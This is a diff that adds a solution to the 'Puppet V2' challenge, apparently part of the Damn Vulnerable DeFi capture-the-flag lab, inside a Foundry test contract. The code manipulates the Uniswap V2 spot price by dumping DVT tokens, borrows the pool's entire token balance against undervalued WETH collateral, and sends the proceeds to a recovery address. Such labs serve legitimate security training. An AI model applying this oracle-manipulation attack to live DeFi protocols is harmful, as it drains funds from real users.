@@ -11,6 +11,8 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
 contract PuppetV2Challenge is Test {
+    event Balances(uint256, uint256);
+
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -98,7 +100,41 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        address[] memory reversedPath = new address[](2);
+        reversedPath[0] = address(weth);
+        reversedPath[1] = address(token);
+
+        // ---
+
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        weth.approve(address(lendingPool), type(uint256).max);
+
+        // Player: 20 ETH + 10000 DVT
+
+        uniswapV2Router.swapExactTokensForETH(10000 ether, 0, path, player, type(uint256).max);
+        weth.deposit{value: player.balance}();
+        // Player: ~29.9 WETH + 0 DVT
+
+        lendingPool.borrow(100000 ether);
+        // Player: ~26.95 WETH + 100000 DVT
+
+        uniswapV2Router.swapExactTokensForETH(100000 ether, 0, path, player, type(uint256).max);
+        weth.deposit{value: player.balance}();
+        // Player: ~27.04 WETH + 0 DVT
+
+        lendingPool.borrow(900000 ether);
+        // Player: ~26.82 WETH + 900000 DVT
+
+        weth.withdraw(weth.balanceOf(player));
+
+        uniswapV2Router.swapETHForExactTokens{value: player.balance}(100000 ether, reversedPath, player, type(uint256).max);
+        token.transfer(recovery, token.balanceOf(player));
+
+        emit Balances(token.balanceOf(player), player.balance+weth.balanceOf(player));
     }
 
     /**
